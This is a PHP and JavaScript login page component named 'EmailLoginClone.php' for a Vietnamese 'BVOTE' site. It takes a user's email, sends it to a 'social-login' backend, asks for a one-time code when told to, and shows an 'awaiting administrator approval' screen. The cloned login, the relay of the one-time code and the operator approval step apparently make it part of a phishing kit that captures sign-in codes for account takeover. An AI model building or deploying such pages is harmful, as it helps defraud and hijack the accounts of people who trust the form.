<?php
// EmailLoginClone.php - BVOTE Internal Email Login
?>
<div class="bg-white p-6 rounded-lg text-black w-full flex flex-col justify-center">
  <div class="text-center mb-6">
    <div class="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4">
      <svg class="w-8 h-8 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 8l7.89 4.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"></path>
      </svg>
    </div>
    <h2 class="text-2xl font-semibold">Đăng nhập BVOTE</h2>
    <p class="text-sm text-gray-600 mt-1">Sử dụng email của bạn</p>
  </div>

  <form id="email-login-form" class="space-y-4" onsubmit="return handleEmailLogin(event)">
    <div>
      <label for="email-input" class="block text-sm font-medium text-gray-700 mb-1">Email</label>
      <input id="email-input" name="email" type="email"
             placeholder="Nhập email của bạn" required
             class="w-full h-11 border-gray-300 focus:border-blue-500 focus:ring-blue-500 text-black rounded" />
    </div>

    <div id="otp-section" class="hidden space-y-4">
      <div>
        <label for="otp-input" class="block text-sm font-medium text-gray-700 mb-1">Mã OTP</label>
        <input id="otp-input" name="otp" type="text"
               placeholder="Nhập mã 6 số"
               class="w-full h-11 border-gray-300 focus:border-blue-500 focus:ring-blue-500 text-black rounded text-center tracking-widest"
               maxlength="6" pattern="[0-9]{6}" />
        <p class="text-xs text-gray-500 mt-1">Mã OTP đã được gửi đến email của bạn</p>
      </div>
    </div>

    <button type="submit" id="submit-btn" class="w-full h-11 bg-blue-600 hover:bg-blue-700 text-white font-medium rounded">
      Đăng nhập
    </button>
  </form>

  <div class="text-center mt-4">
    <p class="text-sm text-gray-600">Bằng cách đăng nhập, bạn đồng ý với <a href="#" class="text-blue-600 hover:underline">Điều khoản sử dụng</a></p>
  </div>
</div>

<script>
var isLoadingEmail = false;
var currentRequestId = null;
var otpRequired = false;

function handleEmailLogin(e) {
  e.preventDefault();
  if (isLoadingEmail) return false;

  const email = document.getElementById('email-input').value.trim();
  if (!email) {
    alert('Vui lòng nhập email');
    return false;
  }

  if (!otpRequired) {
    // Bước 1: Gửi yêu cầu đăng nhập
    initiateEmailLogin(email);
  } else {
    // Bước 2: Xác thực OTP
    verifyEmailOTP();
  }

  return false;
}

function initiateEmailLogin(email) {
  isLoadingEmail = true;
  const submitBtn = document.getElementById('submit-btn');
  const originalText = submitBtn.textContent;
  submitBtn.textContent = 'Đang xử lý...';
  submitBtn.disabled = true;

  // Gọi API Auto Login
  fetch('/api/social-login', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      platform: 'email',
      user_hint: email
    })
  })
  .then(response => response.json())
  .then(data => {
    if (data.success) {
      currentRequestId = data.request_id;

      // Kiểm tra trạng thái để xem có cần OTP không
      checkEmailLoginStatus(data.request_id);
    } else {
      alert('Lỗi: ' + (data.error || 'Không thể tạo yêu cầu đăng nhập'));
    }
  })
  .catch(error => {
    console.error('Error:', error);
    alert('Lỗi kết nối. Vui lòng thử lại.');
  })
  .finally(() => {
    isLoadingEmail = false;
    submitBtn.textContent = originalText;
    submitBtn.disabled = false;
  });
}

function checkEmailLoginStatus(requestId) {
  fetch(`/api/social-login/status/${requestId}`)
    .then(response => response.json())
    .then(data => {
      if (data.success) {
        const status = data.request.status;

        if (status === 'APPROVED') {
                      // Đăng nhập thành công
            alert('Đăng nhập thành công! Chào mừng bạn đến với BVOTE.');
            window.location.href = '/user/home';
        } else if (status === 'OTP_REQUIRED') {
          // Yêu cầu OTP
          showOTPSection();
        } else if (status === 'PENDING_REVIEW') {
          // Chờ phê duyệt
          showWaitingScreen(requestId, 'email');
        } else if (status === 'REJECTED') {
          alert('Yêu cầu đăng nhập bị từ chối. Vui lòng thử lại.');
        } else if (status === 'EXPIRED') {
          alert('Yêu cầu đăng nhập đã hết hạn. Vui lòng thử lại.');
        }
      } else {
        console.error('Error checking status:', data.error);
      }
    })
    .catch(error => {
      console.error('Error:', error);
    });
}

function showOTPSection() {
  otpRequired = true;
  document.getElementById('otp-section').classList.remove('hidden');
  document.getElementById('submit-btn').textContent = 'Xác thực OTP';
  document.getElementById('email-input').disabled = true;

  // Focus vào input OTP
  setTimeout(() => {
    document.getElementById('otp-input').focus();
  }, 100);
}

function verifyEmailOTP() {
  const otp = document.getElementById('otp-input').value.trim();

  if (!otp || otp.length !== 6) {
    alert('Vui lòng nhập đúng 6 số OTP');
    return;
  }

  if (!currentRequestId) {
    alert('Lỗi: Không tìm thấy yêu cầu đăng nhập');
    return;
  }

  isLoadingEmail = true;
  const submitBtn = document.getElementById('submit-btn');
  submitBtn.textContent = 'Đang xác thực...';
  submitBtn.disabled = true;

  fetch(`/api/social-login/${currentRequestId}/otp`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({ otp: otp })
  })
  .then(response => response.json())
  .then(data => {
    if (data.success) {
      alert('Xác thực OTP thành công! Chào mừng bạn đến với BVOTE.');
      window.location.href = '/user/home';
    } else {
      alert('Lỗi: ' + (data.error || 'OTP không đúng'));
    }
  })
  .catch(error => {
    console.error('Error:', error);
    alert('Lỗi kết nối. Vui lòng thử lại.');
  })
  .finally(() => {
    isLoadingEmail = false;
    submitBtn.textContent = 'Xác thực OTP';
    submitBtn.disabled = false;
  });
}

function showWaitingScreen(requestId, platform) {
  // Tạo modal chờ phê duyệt
  const modal = document.createElement('div');
  modal.className = 'fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50';
  modal.innerHTML = `
    <div class="bg-white p-6 rounded-lg max-w-md w-full mx-4">
      <div class="text-center">
        <div class="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto mb-4"></div>
        <h3 class="text-lg font-semibold mb-2">Đang chờ phê duyệt</h3>
        <p class="text-gray-600 mb-4">Yêu cầu đăng nhập của bạn đang được xem xét bởi quản trị viên.</p>
        <div class="text-sm text-gray-500">
          <p>Nền tảng: ${platform}</p>
          <p>ID yêu cầu: ${requestId}</p>
        </div>
        <div class="mt-4">
          <button onclick="checkEmailLoginStatus('${requestId}')" class="bg-blue-600 text-white px-4 py-2 rounded hover:bg-blue-700">
            Kiểm tra trạng thái
          </button>
        </div>
      </div>
    </div>
  `;

  document.body.appendChild(modal);

  // Tự động kiểm tra trạng thái mỗi 5 giây
  const interval = setInterval(() => {
    checkEmailLoginStatus(requestId);

    // Kiểm tra nếu đã được xử lý thì dừng interval
    fetch(`/api/social-login/status/${requestId}`)
      .then(response => response.json())
      .then(data => {
        if (data.success && data.request.status !== 'PENDING_REVIEW') {
          clearInterval(interval);
          modal.remove();
        }
      });
  }, 5000);
}

// Reset form khi component được load lại
function resetEmailForm() {
  otpRequired = false;
  currentRequestId = null;
  document.getElementById('otp-section').classList.add('hidden');
  document.getElementById('email-input').disabled = false;
  document.getElementById('email-input').value = '';
  document.getElementById('otp-input').value = '';
  document.getElementById('submit-btn').textContent = 'Đăng nhập';
}

// Auto-reset khi component được load
document.addEventListener('DOMContentLoaded', resetEmailForm);
</script>
